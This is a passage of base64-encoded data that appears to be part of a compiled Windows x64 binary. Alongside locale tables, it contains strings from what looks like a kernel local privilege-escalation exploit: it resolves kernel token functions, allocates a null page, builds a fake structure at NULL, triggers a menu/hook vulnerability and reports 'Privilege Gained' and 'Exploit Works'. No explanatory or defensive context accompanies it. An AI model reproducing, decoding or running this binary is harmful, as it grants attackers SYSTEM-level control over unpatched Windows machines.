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8gZmFpbGVkAAAAAFshXSBSZXF1ZXN0aW5nIGtlcm5lbCBtb2R1bGVzIHRocm91Z2ggWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uIGZhaWxlZAAAAFsqXSBQYXJzaW5nIFNZU1RFTV9JTkZPLi4uAAAAAAAAWypdICVkIEtlcm5lbCBtb2R1bGVzIGZvdW5kAAAAAABbKl0gQ2hlY2tpbmcgbW9kdWxlICVzAAAuZXhlAAAAAG50AAAAAAAAWypdIEdvb2QhIG50IGZvdW5kIGFzICVzIGF0IDB4JTA4eAAAAAAAAFsqXSAlcyBsb2FkZWQgaW4gdXNlcnNwYWNlIGF0OiAlMDh4AAAAAABQc0xvb2t1cFByb2Nlc3NCeVByb2Nlc3NJZAAAAAAAAFshXSBGYWlsZWQgdG8gc29sdmUgUHNMb29rdXBQcm9jZXNzQnlQcm9jZXNzSWQAAFsqXSBwUHNMb29rdXBQcm9jZXNzQnlQcm9jZXNzSWQgaW4ga2VybmVsOiAweCVwAFBzUmVmZXJlbmNlUHJpbWFyeVRva2VuAFsqXSBwUHNSZWZlcmVuY2VQcmltYXJ5VG9rZW4gaW4ga2VybmVsOiAweCVwAAAAAFsqXSBSZWdpc3RlcmluZyBjbGFzcy4uLgAAAAAAAAAAd29xdW5pbWFsZWdlYmkAAFshXSBSZWdpc3RlckNsYXNzQSBmYWlsZWQgAAAAAAAAWypdIENyZWF0aW5nIHdpbmRvdy4uLgAAWyFdIENyZWF0ZVdpbmRvd0V4QSBmYWlsZWQAAAAAAABbKl0gQWxsb2NhdGluZyBudWxsIHBhZ2UuLi4AAAAAAFshXSBGYWlsZWQgdG8gYWxsb2NhdGUgbnVsbCBwYWdlAAAAAAAAAABbKl0gR2V0dGluZyBQdGlDdXJyZW50Li4uAAAAAAAAAHVzZXIzMi5kbGwAAAAAAABnZGkzMi5kbGwAAAAAAAAAWyFdIEZpbGVkIHRvIGdldCBjdXJyZW50IHRocmVhZCBpbmZvcm1hdGlvbgAAAAAAWypdIEdvb2QhIGR3VGhyZWFkSW5mb1B0ciAweCVwAABbKl0gQ3JlYXRpbmcgYSBmYWtlIHN0cnVjdHVyZSBhdCBOVUxMLi4uAAAAAAAAAABbKl0gVHJpZ2dlcmluZyB2dWxuZXJhYmlsaXR5Li4uAFshXSBGaXJzdCBDcmVhdGVQb3B1cE1lbnUgZmFpbGVkAAAAAAAAAABbIV0gRmlyc3QgSW5zZXJ0TWVudUl0ZW1BIGZhaWxlZAAAAAAAAAAAWyFdIFNlY29uZCBDcmVhdGVQb3B1cE1lbnUgZmFpbGVkAAAAAAAAAFshXSBTZWNvbmQgSW5zZXJ0TWVudUl0ZW1BIGZhaWxlZAAAAAAAAABbIV0gU2V0V2luZG93c0hvb2tFeEEgZmFpbGVkIDotKAAAAAAAAAAAWyFdIFByaXZpbGVnZSBHYWluZWQAAAAARXhwbG9pdCBXb3JrcwAAAAAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAUABAAAAAAAAAAAAAAAAAAAAAAAAAFJTRFNVCjf8xuzpQ6us+kakeP4IAwAAAEM6XFVzZXJzXE1vYmlsZVxkb2N1bWVudHNcdmlzdWFsIHN0dWRpbyAyMDEzXFByb2plY3RzXGV4cGxvaXRceDY0XFJlbGVhc2VcZXhwbG9pdC5wZGIAAAAAAAAAhQAAAIUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABksAgAaAQcBfF8AACAIAAABBAEABEIAAAEPBgAPZAcADzQGAA8yC3ABFAgAFGQIABRUBwAUNAYAFDIQcAEKBAAKNAgAClIGcBkjBAASAVEAAzACUHxfAABwAgAAIQgCAAhkVABgEgAAyxIAAOBLAQAhCAIACPRQAMsSAAAmEwAA9EsBACEIAgAIdFUAJhMAAG4TAAAITAEAIQgCAAjkVgBuEwAA0xMAABxMAQAhAAAAbhMAANMTAAAcTAEAIQACAADkVgBuEwAA0xMAABxMAQAhAAAAJhMAAG4TAAAITAEAIQAAAMsSAAAmEwAA9EsBACEAAABgEgAAyxIAAOBLAQABAAAAAQoEAAo0BAAKEgZwAQYCAAZSAjABGwoAG3QQABtkDwAbNA4AG5IU8BLgEFARGQMAGUIVcBQwAACwQQAAAQAAALscAAD3HAAAYN8AAAAAAAAJCgQACjQJAApSBnCwQQAAAQAAAJAeAAAsHwAAh98AACwfAAABCQEACWIAAAEUCAAUZAYAFFQFABQ0BAAUEhBwAQQBAARiAAAZLwkAHnS7AB5kugAeNLkAHgG2ABBQAAB8XwAAoAUAAAEXCAAXZAkAF1QIABc0BwAXMhNwA